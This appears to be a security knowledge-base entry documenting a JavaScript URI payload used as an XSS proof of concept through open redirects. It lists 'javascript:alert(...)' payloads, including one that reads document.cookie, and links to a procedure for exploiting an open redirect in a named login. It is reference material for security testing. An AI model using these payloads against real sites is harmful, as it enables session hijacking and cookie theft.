---
data: 'javascript:alert("proof of concept")'
tags:
  - xss
  - poc
type: command
executor: javascript
platforms:
  - Web
id: f90d517c-9d96-4e7e-b5a2-3dfb1ac9d972
created_at: '2025-12-13T23:56:20.513Z'
updated_at: '2025-12-13T23:56:20.513Z'
verified: false
validated: true
submitted: true
---
# JavaScript Alert POC

## Command

```javascript
javascript:alert("proof of concept")
```

## Description

This JavaScript URI executes an alert dialog in the browser, used as a proof of concept for XSS vulnerabilities via open redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `alert` | Displays a message in a dialog box | Yes |

## Examples

### Basic Usage

```javascript
javascript:alert("proof of concept")
```

### Advanced Usage

```javascript
javascript:alert(document.cookie)
```

## Expected Output

A browser alert box displaying 'proof of concept' or the specified message.

## Related

- [[procedures/Exploit-Open-Redirect-in-MoPub-Login]]
- [[procedures/Execute-XSS-via-JavaScript-URI]]
